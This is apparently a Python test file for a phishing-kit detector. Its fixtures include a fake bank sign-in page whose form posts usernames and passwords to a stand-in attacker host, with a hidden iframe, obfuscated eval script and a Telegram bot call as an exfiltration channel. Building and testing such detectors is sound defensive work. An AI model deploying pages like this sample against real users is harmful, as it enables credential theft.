"""Hermetic tests for phish_kit."""

from aegis.engines.base import ScanContext
from aegis.engines.phish_kit import PhishKit

KIT_HTML = """
<html><head><title>Sign in - Your Bank</title></head><body>
<h1>Verify your account to continue</h1>
<form action="https://evil-drop.ru/collect.php" method="post">
<input type="text" name="user">
<input type="password" name="pass">
<input type="submit" value="Confirm identity">
</form>
<iframe src="https://evil-drop.ru/x" style="display: none"></iframe>
<script>eval(unescape('%3c%73%63%72%69%70%74%3e'))</script>
<script src="https://api.telegram.org/bot123456:ABC/sendMessage"></script>
</body></html>
"""

CLEAN_LOGIN = """
<html><body>
<h1>Sign in</h1>
<form action="https://example.com/login" method="post">
<input type="text" name="user">
<input type="password" name="pass">
</form>
</body></html>
"""


def ctx(pages, targets=None, **options):
    return ScanContext(data={"pages": pages}, targets=targets or {}, options=options)


def test_full_kit_scores_high():
    f = PhishKit().scan(ctx({"https://bank-secure.ru/login": KIT_HTML}))
    assert len(f) == 1
    # 30 + 40 + 25 + 20 + 15 + 25 = 155, capped at 100
    assert f[0].score == 100
    assert f[0].severity == "critical"
    markers = f[0].evidence["matched_markers"]
    assert "telegram_exfil" in markers
    assert "credential_harvester" in markers
    assert "obfuscated_js" in markers


def test_benign_login_below_threshold():
    # password input (30) + own-domain form post (not matched) -> below 35
    f = PhishKit().scan(
        ctx({"https://example.com/login": CLEAN_LOGIN}, targets={"domain": "example.com"})
    )
    assert f == []


def test_boundary_score_fires():
    # hidden iframe (20) + brand impersonation (15) = 35 -> fires at >= min_score
    html = (
        '<p>Please verify your account now</p>'
        '<iframe src="x" style="display: none"></iframe>'
    )
    f = PhishKit().scan(ctx({"https://suspicious.example/x": html}))
    assert len(f) == 1
    assert f[0].score == 35


def test_min_score_option_raises_bar():
    html = (
        '<p>Please verify your account now</p>'
        '<iframe src="x" style="display: none"></iframe>'
    )
    f = PhishKit().scan(ctx({"https://suspicious.example/x": html}, min_score=90))
    assert f == []


def test_brand_domain_excluded_from_form_post():
    html = '<form action="https://example.com/login"><input type="password"></form>'
    # without brand context, example.com is excluded by the default pattern
    f = PhishKit().scan(ctx({"https://x.example/y": html}))
    assert f == []  # 30 < 35 anyway
    # foreign form post (25) + password (30) = 55 -> fires
    html2 = '<form action="https://evil.ru/login"><input type="password"></form>'
    f2 = PhishKit().scan(ctx({"https://x.example/y": html2}))
    assert len(f2) == 1
    assert "external_form_post" in f2[0].evidence["matched_markers"]


def test_own_brand_form_post_not_matched():
    html = (
        '<form action="https://mybank.com/login">'
        '<input type="password" name="p">'
        '<script>eval(unescape("%41"))</script>'
        "</form>"
    )
    f = PhishKit().scan(
        ctx({"https://mybank.com/login": html}, targets={"domain": "mybank.com"})
    )
    # password (30) + obfuscated_js (25) = 55, no external_form_post
    assert len(f) == 1
    assert "external_form_post" not in f[0].evidence["matched_markers"]


def test_empty_pages():
    assert PhishKit().scan(ScanContext(data={})) == []


def test_score_capped_at_100():
    f = PhishKit().scan(ctx({"https://evil.ru/": KIT_HTML}))
    assert f[0].score == 100
    assert f[0].score <= 100
